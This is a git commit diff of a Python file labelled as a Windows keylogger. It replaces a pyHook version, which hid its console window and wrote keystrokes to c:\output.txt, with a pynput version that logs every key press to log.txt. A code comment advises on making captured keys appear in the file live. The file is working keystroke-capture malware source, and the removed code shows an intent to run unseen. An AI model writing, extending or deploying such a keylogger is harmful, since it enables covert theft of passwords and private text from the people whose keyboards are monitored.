469461d1efdb77288e28c5e0380c424eecb584b2
Viktor Þór <viktorthorr@gmail.com>
2020-04-03 21:04:10 +0000

    Windows breytingar

--- windows.py
+++ windows.py
@@ -1,30 +1,20 @@
 ###################################
 # Keylogger to be used in Windows #
 ###################################
-import win32api
-import win32console
-import win32gui
-import pythoncom, pyHook
+from pynput.keyboard import Key, Listener
+import logging
 
-win = win32console.GetConsoleWindow()
-win32gui.ShowWindow(win, 0)
+log_dir = ""
 
-def OnKeyboardEvent(event):
-	if event.Ascii==5:
-		_exit(1)
-	if event.Ascii !=0 or 8:
-		f = open('c:\output.txt', 'r+')
-		buffer = f.read()
-		f.close()
-		f = open('c:\output.txt', 'w')
-		keylogs = chr(event.Ascii)
-	if event.Ascii == 13:
-		keylogs = '/n'
-		buffer += keylogs
-		f.write(buffer)
-		f.close()
+# Probably best to simply removing logging all together and replace logging.info with
+# file write statements (after open()). I would recommend opening the file in append
+# mode on each write so you can see characters in the file while they are being picked up.
+logging.basicConfig(filename=(log_dir + "log.txt"), level=logging.DEBUG, format='%(message)s')
 
-hm = pyHook.HookManager()
-hm.KeyDown = OnKeyboardEvent
-hm.HookKeyboard()
-pythoncom.PumpMessages()
+def on_press(key):
+    if(str(key) == "Key.enter" or str(key) == "Key.tab"):
+        logging.info(str(key) + '\n')
+    logging.info(str(key))
+
+with Listener(on_press=on_press) as listener:
+    listener.join()
